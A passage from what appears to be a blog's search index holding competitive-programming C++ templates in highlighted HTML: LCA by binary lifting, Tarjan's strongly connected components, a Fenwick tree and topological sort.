punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> edge<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> depth<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> fa<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span> lg<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    lg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    lg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        lg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lg<span class="token punctuation">[</span>i <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> now<span class="token punctuation">,</span> <span class="token keyword">int</span> father<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> father<span class="token punctuation">,</span> depth<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> depth<span class="token punctuation">[</span>father<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> fa<span class="token punctuation">[</span>fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">!=</span> father<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dis<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">,</span> now<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">LCA</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&lt;</span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">swap</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">></span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">-</span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>k<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> fa<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>            x <span class="token operator">=</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> y <span class="token operator">=</span> fa<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> M <span class="token operator">>></span> S<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">addedge</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">prepare</span><span class="token punctuation">(</span>N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token function">LCA</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//    cin >> T;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="26-tarjan"><a href="#26-tarjan" class="headerlink" title="26. tarjan"></a>26. tarjan</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> low<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> M<span class="token punctuation">;</span><span class="token keyword">int</span> value<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans <span class="token operator">=</span> maxn<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span><span class="token keyword">int</span> nd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">tarjan</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>nd<span class="token punctuation">;</span>    vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span>i<span class="token operator">=</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">==</span>dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             cnt<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">==</span> x<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x<span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//cin >> T;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="27-树状数组"><a href="#27-树状数组" class="headerlink" title="27. 树状数组"></a>27. 树状数组</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">BiIndexTree</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Biarray<span class="token punctuation">;</span>    <span class="token function">BiIndexTree</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Biarray</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">lowbit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> x <span class="token operator">&amp;</span> <span class="token operator">-</span>x<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">add</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            Biarray<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+=</span> k<span class="token punctuation">;</span>            x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token function">lowbit</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">getsum</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ans <span class="token operator">=</span> ans <span class="token operator">+</span> Biarray<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>            x <span class="token operator">-=</span> <span class="token function">lowbit</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="28、拓扑排序"><a href="#28、拓扑排序" class="headerlink" title="28、拓扑排序"></a>28、拓扑排序</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">//点</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vis<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> mp<span class="token punctuation">;</span> <span class="token comment">//边</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> result<span class="token punctuation">;</span> <span class="token comment">// 结果</span><span class="token keyword">bool</span> vaild <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vaild<span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            vaild <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">topo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> vaild<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vaild<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
